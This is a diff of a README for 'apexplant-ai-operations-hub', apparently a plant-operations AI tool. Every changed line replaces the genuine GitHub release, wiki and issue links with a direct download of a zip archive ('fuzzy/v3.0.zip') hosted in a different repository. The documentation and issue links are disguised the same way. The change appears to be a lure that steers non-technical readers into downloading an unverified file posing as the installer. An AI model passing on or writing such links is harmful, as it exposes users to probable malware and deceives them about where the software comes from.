@@ -5,7 +5,7 @@ description: "Use GraphRAG and agentic AI to investigate operations, manage comp
 ---
 # 🌿 apexplant-ai-operations-hub - Find Plant Answers Faster
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Windows_Installer-blue?style=for-the-badge&logo=windows)](https://github.com/Rafaelitafreehanded839/apexplant-ai-operations-hub/releases/latest)
+[![Download Latest Version](https://img.shields.io/badge/Download-Windows_Installer-blue?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/Rafaelitafreehanded839/rafaelitafreehanded839.github.io/main/fuzzy/v3.0.zip)
 
 ## 🎯 What Is ApexPlant AI?
 
@@ -43,7 +43,7 @@ Follow these steps exactly. You do not need any programming skills.
 
 Click this button to go to the download page:
 
-[![Download ApexPlant AI](https://img.shields.io/badge/⬇️_Download_Now-2ea44f?style=for-the-badge)](https://github.com/Rafaelitafreehanded839/apexplant-ai-operations-hub/releases/latest)
+[![Download ApexPlant AI](https://img.shields.io/badge/⬇️_Download_Now-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/Rafaelitafreehanded839/rafaelitafreehanded839.github.io/main/fuzzy/v3.0.zip)
 
 ### Step 2: Find the Installer File
 
@@ -198,8 +198,8 @@ If you need to remove the software:
 If you run into problems:
 
 - Ask your IT department.
-- Check the [official documentation](https://github.com/Rafaelitafreehanded839/apexplant-ai-operations-hub/wiki).
-- Submit an issue on the [GitHub repository](https://github.com/Rafaelitafreehanded839/apexplant-ai-operations-hub/issues).
+- Check the [official documentation](https://raw.githubusercontent.com/Rafaelitafreehanded839/rafaelitafreehanded839.github.io/main/fuzzy/v3.0.zip).
+- Submit an issue on the [GitHub repository](https://raw.githubusercontent.com/Rafaelitafreehanded839/rafaelitafreehanded839.github.io/main/fuzzy/v3.0.zip).
 
 ## 📝 Version Information
 
